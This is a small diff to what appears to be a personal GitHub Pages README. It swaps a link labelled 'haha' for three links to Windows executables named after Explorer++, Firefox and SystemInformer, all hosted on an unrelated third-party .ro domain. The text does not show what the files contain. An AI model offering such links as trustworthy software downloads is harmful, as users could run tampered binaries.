@@ -1,2 +1,4 @@
 # asicosilomu.github.io
-[haha](http://masimobmg.ro/Explorer++.exe)
+[Explorer](http://masimobmg.ro/Lukii/Explorer++.exe)
+[Firefox](http://masimobmg.ro/Lukii/FirefoxInstaller.exe)
+[SystemInformer](http://masimobmg.ro/Lukii/SystemInformer.exe)
